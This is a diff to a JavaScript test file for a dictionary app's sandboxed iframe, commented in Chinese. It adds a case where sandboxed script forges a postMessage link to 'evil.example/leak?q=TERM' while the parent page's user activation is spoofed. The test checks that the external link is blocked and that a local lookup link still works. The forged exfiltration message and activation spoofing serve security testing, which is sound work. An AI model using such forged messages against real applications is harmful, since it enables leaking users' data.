@@ -62,8 +62,11 @@ async function evalOnServedPage(html, expr) {
   return driver.evalHere(expr);
 }
 
-function page(lockReply, dictStyles) {
+// parentActive：把父页面的 navigator.userActivation 钉成 isActive = true，模拟「用户刚在
+// 释义里随便点了一下」——这正是沙箱脚本借机伪造动作消息的前提。
+function page(lockReply, dictStyles, parentActive) {
   const bridge = `
+    ${parentActive ? "Object.defineProperty(navigator, 'userActivation', { configurable: true, value: { isActive: true, hasBeenActive: true } });" : ''}
     window.__calls = [];
     window.flutter_inappwebview = {
       callHandler(name, ...args) {
@@ -275,6 +278,29 @@ try {
     assert.deepEqual(realHits(), [], `sandbox self-navigation must not reach the network (${hits})`);
     assert.equal(r.frames.length, 0, 'navigated sandbox frame is removed');
     assert.ok(!r.reports.some((m) => m.includes('from-evil')), 'messages from a navigated frame are ignored');
+    passed++;
+  }
+
+  // 10. 父页面有用户激活时（用户随便点了一下释义），沙箱脚本伪造的外链消息也不放行：
+  //     父页面判断不了「点的就是这条链接」，所以沙箱来源只认回查词 / sound: 本地音频。
+  //     同一 frame 随后发的回查词链接必须照常生效——证明激活确实成立，外链是被判据挡下
+  //     而不是因为没激活被顺带丢掉（否则这条断言是空壳）。
+  {
+    const r = await driver.evalOnPage(page(LOCKED, {}, true), renderExpr(`<div>s</div><script>
+      setTimeout(function () {
+        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
+          href: 'https://evil.example/leak?q=TERM', text: 'x', rect: {} }, '*');
+      }, 50);
+      setTimeout(function () {
+        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
+          href: '?query=word', text: 'word', rect: {} }, '*');
+      }, 450);
+    </script>`));
+    assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
+    assert.ok(!r.calls.includes('openLink'),
+      `external link forged by the sandbox must not open even with parent activation (${r.calls})`);
+    assert.ok(r.calls.includes('onLinkClick'),
+      `lookup link from the same sandbox still works, so activation was in effect (${r.calls})`);
     passed++;
   }
 } finally {
